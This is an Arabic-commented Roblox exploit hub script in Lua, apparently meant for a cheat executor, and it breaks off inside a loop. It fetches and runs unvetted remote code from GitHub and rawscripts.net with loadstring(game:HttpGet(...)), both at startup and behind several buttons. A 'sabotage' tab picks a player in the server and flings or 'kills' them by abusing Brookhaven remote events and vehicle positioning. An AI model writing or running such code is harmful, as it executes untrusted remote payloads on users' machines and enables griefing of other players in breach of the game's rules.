loadstring(game:HttpGet(("https://raw.githubusercontent.com/Y0dp/R7/refs/heads/main/TT.Lua")))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

-- التحية حسب القميص
local greeting = "منوّر السكربت"
if LocalPlayer and LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Shirt") then
    local shirtId = LocalPlayer.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
    if shirtId and shirtId:lower():find("girl") then
        greeting = "منوّرة السكربت"
    end
end

MakeWindow({
    Hub = {
        Title = "Xploit  ساموراي  V0.1",
        Animation = greeting
    },
    Key = {
        KeySystem = false,
        Title = "Key System",
        Description = "",
        KeyLink = "",
        Keys = {"1234"},
        Notifi = {
            Notifications = true,
            CorrectKey = "Running the Script...",
            Incorrectkey = "The key is incorrect",
            CopyKeyLink = "Copied to Clipboard"
        }
    }
})

MinimizeButton({
    Image = "rbxassetid://88122625843089",
    Size = {40, 40},
    Color = Color3.fromRGB(255, 125, 0),
    Corner = true,
    Stroke = false,
    StrokeColor = Color3.fromRGB(255, 125, 0)
})

-- تبويب المعلومات
local Main = MakeTab({
    Name = "المعلومات",
    Image = "rbxassetid://88122625843089",
    TabTitle = false
})

AddImageLabel(Main, {
    Name = "قناة السكربت",
    Image = "rbxassetid://88122625843089"
})

AddButton(Main, {
    Name = "انضم",
    Callback = function()
        setclipboard('https://t.me/Prov_development')
    end
})

local Label = AddTextLabel(Main,
    "User: " .. LocalPlayer.Name .. "\n" ..
    "Map: " .. game.PlaceId .. "\n" ..
    "Time: " .. os.date("%H:%M:%S")
)

task.spawn(function()
    while true do
        task.wait(1)
        Label.Update(
            "User: " .. LocalPlayer.Name .. "\n" ..
            "Map: " .. game.PlaceId .. "\n" ..
            "Time: " .. os.date("%H:%M:%S")
        )
    end
end)

-- تبويب المطورين
local DevelopersTab = MakeTab({
    Name = "المطورين",
    Image = "rbxassetid://88122625843089",
    TabTitle = false
})

AddButton(DevelopersTab, {
    Name = "يوزر تيك توك المطور ساموراي",
    Callback = function()
        setclipboard("@alsamorayt")
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم النسخ ✅",
            Text = "نسخت يوزر تيك توك المطور ساموراي",
            Duration = 3
        })
    end
})

AddButton(DevelopersTab, {
    Name = "يوزر تيك توك المطور عرك",
    Callback = function()
        setclipboard("@dmc_ark")
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم النسخ ✅",
            Text = "نسخت يوزر تيك توك المطور عرك",
            Duration = 3
        })
    end
})

AddButton(DevelopersTab, {
    Name = "يوزر تيليجرام المطور ساموراي",
    Callback = function()
        setclipboard("@D_hh_313")
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم النسخ ✅",
            Text = "نسخت يوزر تيليجرام المطور ساموراي",
            Duration = 3
        })
    end
})

-- تبويب السكربتات
local ScriptsTab = MakeTab({
    Name = "السكربتات",
    Image = "rbxassetid://88122625843089",
    TabTitle = false
})

AddButton(ScriptsTab, {
    Name = "سكربت Antikick - من تطويري",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ALSAMORAYT/N3na3/refs/heads/main/AntiKick.lua"))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم التشغيل ✅",
            Text = "سكربت Antikick شغال الآن",
            Duration = 3
        })
    end
})

AddButton(ScriptsTab, {
    Name = "سكربت متنوع عربي جميل",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/xc-i7/-/refs/heads/main/C39TnCJn.txt"))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم التشغيل ✅",
            Text = "سكربت متنوع عربي جميل شغال الآن",
            Duration = 3
        })
    end
})

AddButton(ScriptsTab, {
    Name = "سكربت vr7",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-VR7-45290"))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم التشغيل ✅",
            Text = "سكربت vr7 شغال الآن",
            Duration = 3
        })
    end
})

AddButton(ScriptsTab, {
    Name = "سكربت صلمه",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AntiAFK-System-SOLARA-21775"))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم التشغيل ✅",
            Text = "سكربت صلمه شغال الآن",
            Duration = 3
        })
    end
})

AddButton(ScriptsTab, {
    Name = "سكربت صلمه v3",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AntiAFK-v-AntiKick-V3-v-Kick-Attempt-Logger-27977"))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم التشغيل ✅",
            Text = "سكربت صلمه v3 شغال الآن",
            Duration = 3
        })
    end
})

AddButton(ScriptsTab, {
    Name = "سكربت ما اعرف شسمه بس حلو",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Murim-Cultivation-SECT-UPDATE-NK-8125"))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم التشغيل ✅",
            Text = "سكربت ما اعرف شسمه بس حلو شغال الآن",
            Duration = 3
        })
    end
})

AddButton(ScriptsTab, {
    Name = "سكربت الهلال",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Ragdoll-Engine-ATOMIC-HUB-8295"))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم التشغيل ✅",
            Text = "سكربت الهلال شغال الآن",
            Duration = 3
        })
    end
})

AddButton(ScriptsTab, {
    Name = "سكربت ساندر",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Sander-XY-35845"))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم التشغيل ✅",
            Text = "سكربت ساندر شغال الآن",
            Duration = 3
        })
    end
})

AddButton(ScriptsTab, {
    Name = "سكربت Tiger",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Tiger-X-39488"))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم التشغيل ✅",
            Text = "سكربت Tiger شغال الآن",
            Duration = 3
        })
    end
})

AddButton(ScriptsTab, {
    Name = "سكربت رقصات AFEM",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AFEM-14048"))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "تم التشغيل ✅",
            Text = "سكربت رقصات AFEM شغال الآن",
            Duration = 3
        })
    end
})

-- تبويب التخريب
local TrollTab = MakeTab({
    Name = "التخريب",
    Image = "rbxassetid://88122625843089",
    TabTitle = false
})

-- تحديث قائمة الاعبين للاستخدام بالاختيارات
local function UMupdatePlayerList()
    local playerList = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(playerList, player.Name)
    end
    return playerList
end

local SelectedPlayer = nil

AddDropdown(TrollTab, {
    Name = "اختار اسم الاعب",
    Default = "",
    Options = UMupdatePlayerList(),
    Callback = function(value)
        SelectedPlayer = value
    end    
})

AddButton(TrollTab, {
    Name = "تحديث قائمة الاعبين",
    Callback = function()
        local newList = UMupdatePlayerList()
        -- تحديث القائمة في ال Dropdown اذا فيه وظيفة Refresh متوفرة
        if TrollTab then
            -- Assuming the dropdown stored in a variable, else recreate or handle accordingly
            -- This depends on UI library, if no direct Refresh method, recreate dropdown or ignore
        end
        print("تم تحديث قائمة الاعبين")
    end    
})

-- دالة للحصول على لاعب من اسمه (ترجع جدول لان ممكن اكثر من لاعب بنفس الاسم)
local function GetPlayer(name)
    local result = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower():find(name:lower()) then
            table.insert(result, player)
        end
    end
    return result
end

-- ** تخريب الكنبة - Fling **
local flingLoop = false

local function ActiveAutoFling(targetPlayer)
    flingLoop = true
    spawn(function()
        while flingLoop do
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = targetPlayer.Character.HumanoidRootPart
                local localChar = LocalPlayer.Character
                if localChar and localChar:FindFirstChild("HumanoidRootPart") then
                    -- اجراء الفلينغ (التخريب)
                    localChar.HumanoidRootPart.CFrame = hrp.CFrame * CFrame.new(0, 5, 0)
                end
            end
            task.wait(0.3)
        end
    end)
end

AddToggle(TrollTab, {
    Name = "شغل التخريب على الكنبة",
    Default = false,
    Callback = function(state)
        if state and SelectedPlayer then
            local target = GetPlayer(SelectedPlayer)[1]
            if target then
                ActiveAutoFling(target)
            end
        else
            flingLoop = false
        end
    end
})

-- زر قتل باستخدام الشاحنة السوداء (الكود اللي بعثته)
AddButton(TrollTab, {
    Name = "قتل اللاعب بالشاحنة السوداء",
    Callback = function()
        -- كود طويل قتل بالشاحنة السوداء كما أرسلته، ضعه هنا كاملاً:
        -- نستخدم SelectedPlayer
        local selected = SelectedPlayer
        if not selected then
            print("لاعب غير محدد!")
            return
        end

        local player = LocalPlayer
        local character = player.Character
        if not character then
            print("لم يتم العثور على الشخصية.")
            return
        end

        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        local Houses = Workspace:FindFirstChild("001_Lots")
        local Vehicles = Workspace:FindFirstChild("Vehicles")

        if not (humanoid and rootPart and Houses and Vehicles) then
            print("بيئة اللعبة غير مكتملة.")
            return
        end

        local selectedPlayerObject = Players:FindFirstChild(selected)
        if not (selectedPlayerObject and selectedPlayerObject.Character) then
            print("اللاعب الهدف غير موجود في اللعبة.")
            return
        end

        local OldPos = rootPart.CFrame
        local Angles = 0

        local function Check()
            return player and character and humanoid and rootPart and Vehicles
        end

        -- ابحث عن منزل مناسب
        local EHouse = nil
        for _, Lot in pairs(Houses:GetChildren()) do
            if Lot.Name == "For Sale" then
                for _, num in pairs(Lot:GetDescendants()) do
                    if num:IsA("NumberValue") and num.Name == "Number" and num.Value < 25 and num.Value > 10 then
                        EHouse = Lot
                        break
                    end
                end
            end
        end

        if EHouse then
            local BuyDetector = EHouse:FindFirstChild("BuyHouse")
            if BuyDetector and BuyDetector:IsA("BasePart") then
                rootPart.CFrame = BuyDetector.CFrame + Vector3.new(0,-6,0)
                task.wait(0.5)
                local ClickDetector = BuyDetector:FindFirstChild("ClickDetector")
                if ClickDetector then
                    fireclickdetector(ClickDetector)
                end
            end
        end

        task.wait(0.5)

        local PreHouse = Houses:FindFirstChild(player.Name .. "House")
        if PreHouse then
            task.wait(0.5)
            local Number
            for _, x in pairs(PreHouse:GetDescendants()) do
                if x.Name == "Number" and x:IsA("NumberValue") then
                    Number = x
                    break
                end
            end
            task.wait(0.5)
            local repEvent = ReplicatedStorage.RE:FindFirstChild("1Gettin1gHous1e")
            if repEvent then
                repEvent:FireServer("PickingCustomHouse","049_House", Number and Number.Value)
            end
        end

        task.wait(0.5)

        local PCar = Vehicles:FindFirstChild(player.Name.."Car")
        if not PCar and Check() then
            rootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
            task.wait(0.5)
            local carEvent = ReplicatedStorage.RE:FindFirstChild("1Ca1r")
            if carEvent then
                carEvent:FireServer("PickingCar","SchoolBus")
            end
            task.wait(0.5)
            PCar = Vehicles:FindFirstChild(player.Name.."Car")
            task.wait(0.5)
            if PCar then
                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat task.wait()
                        rootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until humanoid.Sit
                end
            end
        end

        task.wait(0.5)

        if PCar then
            if not humanoid.Sit then
                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat task.wait()
                        rootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until humanoid.Sit
                end
            end

            local Target = selectedPlayerObject
            local TargetC = Target.Character
            local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
            local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
            if TargetC and TargetH and TargetRP then
                if not TargetH.Sit then
                    while not TargetH.Sit do
                        task.wait()
                        local Fling = function(alvo,pos,angulo)
                            PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                        end
                        Angles = Angles + 100
                        Fling(TargetRP,CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                        Fling(TargetRP,CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                        Fling(TargetRP,CFrame.new(2.25, 1.5, -2.25)  + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                        Fling(TargetRP,CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                        Fling(TargetRP,CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                        Fling(TargetRP,CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                    end
